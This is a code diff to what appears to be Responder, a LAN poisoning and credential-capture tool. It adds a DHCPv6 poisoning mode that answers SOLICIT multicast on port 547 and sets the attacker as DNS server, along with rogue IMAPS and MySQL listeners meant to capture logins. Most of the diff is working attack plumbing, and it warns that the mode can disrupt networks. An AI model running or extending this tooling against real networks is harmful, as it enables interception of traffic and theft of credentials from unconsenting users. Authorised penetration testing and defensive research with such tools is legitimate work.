@@ -36,6 +36,8 @@ parser.add_option('-b', '--basic',         action="store_true", help="Return a B
 parser.add_option('-d', '--DHCP',          action="store_true", help="Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False", dest="DHCP_On_Off", default=False)
 parser.add_option('-D', '--DHCP-DNS',     action="store_true", help="This option will inject a DNS server in the DHCP response, otherwise a WPAD server will be added. Default: False", dest="DHCP_DNS", default=False)
 
+parser.add_option('--dhcpv6', action="store_true", help="Enable DHCPv6 poisoning attack (disabled by default). Responds to DHCPv6 SOLICIT messages and configures attacker as DNS server. WARNING: May cause network disruption.", dest="DHCPv6_On_Off", default=False)
+
 parser.add_option('-w','--wpad',           action="store_true", help="Start the WPAD rogue proxy server. Default value is False", dest="WPAD_On_Off", default=False)
 parser.add_option('-u','--upstream-proxy', action="store",      help="Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port)", dest="Upstream_Proxy", default=None)
 parser.add_option('-F','--ForceWpadAuth',  action="store_true", help="Force NTLM/Basic authentication on wpad.dat file retrieval. This may cause a login prompt. Default: False", dest="Force_WPAD_Auth", default=False)
@@ -132,6 +134,34 @@ class ThreadingTCPServerAuth(ThreadingMixIn, TCPServer):
 				pass
 		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
 		TCPServer.server_bind(self)
+	
+class ThreadingUDPDHCPv6Server(ThreadingMixIn, UDPServer):
+	allow_reuse_address = True
+	address_family = socket.AF_INET6
+	
+	def server_bind(self):
+		import socket
+		import struct
+		
+		# Bind to :: (accept packets to ANY address including multicast)
+		UDPServer.server_bind(self)
+		
+		print(color("[DHCPv6] Make sure to review DHCPv6 settings Responder.conf\n[DHCPv6] Only run this module for short periods of time, you might cause some disruption.", 2, 1))
+		
+		# Join multicast group
+		group = socket.inet_pton(socket.AF_INET6, 'ff02::1:2')
+		if_index = socket.if_nametoindex(settings.Config.Interface)
+		mreq = group + struct.pack('@I', if_index)
+		
+		try:
+			self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
+			self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_LOOP, 1)
+			print(color("[DHCPv6] Joined ff02::1:2 port 547 on %s" % settings.Config.Interface, 2, 1))
+		except Exception as e:
+			print(color("[!] Multicast join failed: %s" % str(e), 1, 1))
+
+# Set address family to IPv6
+ThreadingUDPDHCPv6Server.address_family = socket.AF_INET6
 
 class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
 	def server_bind(self):
@@ -252,6 +282,14 @@ def serve_thread_udp(host, port, handler):
 	except:
 		print(color("[!] ", 1, 1) + "Error starting UDP server on port " + str(port) + ", check permissions or other servers running.")
 
+def serve_thread_dhcpv6(host, port, handler):
+	try:
+		# MUST bind to :: to receive multicast packets
+		server = ThreadingUDPDHCPv6Server(('::', port), handler)
+		server.serve_forever()
+	except Exception as e:
+		print(color("[!] DHCPv6 error: %s" % str(e), 1, 1))
+		
 def serve_thread_tcp(host, port, handler):
 	try:
 		if OsInterfaceIsSupported():
@@ -300,8 +338,13 @@ def main():
 		print(color('\n[+]', 2, 1) + " Listening for events...\n")
 
 		threads = []
-
-		# Load (M)DNS, NBNS and LLMNR Poisoners
+        #IPv6 Poisoning
+		# DHCPv6 Server (disabled by default, enable with --dhcpv6)
+		if settings.Config.DHCPv6_On_Off:
+		    from servers.DHCPv6 import DHCPv6
+		    threads.append(Thread(target=serve_thread_dhcpv6, args=('', 547, DHCPv6,)))	
+			    
+		# Load MDNS, NBNS and LLMNR Poisoners
 		if settings.Config.LLMNR_On_Off:
 		    from poisoners.LLMNR import LLMNR
 		    threads.append(Thread(target=serve_LLMNR_poisoner, args=('', 5355, LLMNR,)))
@@ -405,6 +448,9 @@ def main():
 		if settings.Config.IMAP_On_Off:
 			from servers.IMAP import IMAP
 			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 143, IMAP,)))
+			from servers.IMAP import IMAPS
+			threads.append(Thread(target=serve_thread_tcp, args=(settings.Config.Bind_To, 993, IMAPS,)))
+
 
 		if settings.Config.DNS_On_Off:
 			from servers.DNS import DNS, DNSTCP
@@ -414,6 +460,10 @@ def main():
 		if settings.Config.SNMP_On_Off:
 			from servers.SNMP import SNMP
 			threads.append(Thread(target=serve_thread_udp, args=('', 161, SNMP,)))
+
+		if settings.Config.MYSQL_On_Off:
+			from servers.MYSQL import MySQL
+			threads.append(Thread(target=serve_thread_tcp, args=('', 3306, MySQL,)))
 
 		for thread in threads:
 			thread.daemon = True
@@ -433,6 +483,14 @@ def main():
 			time.sleep(1)
 
 	except KeyboardInterrupt:
+		# Optional: Print DHCPv6 statistics on shutdown
+		if settings.Config.DHCPv6_On_Off:
+			try:
+				from servers.DHCPv6 import print_dhcpv6_stats
+				print_dhcpv6_stats()
+			except:
+				raise
+				pass
 		sys.exit("\r%s Exiting..." % color('[+]', 2, 1))
 
 if __name__ == '__main__':
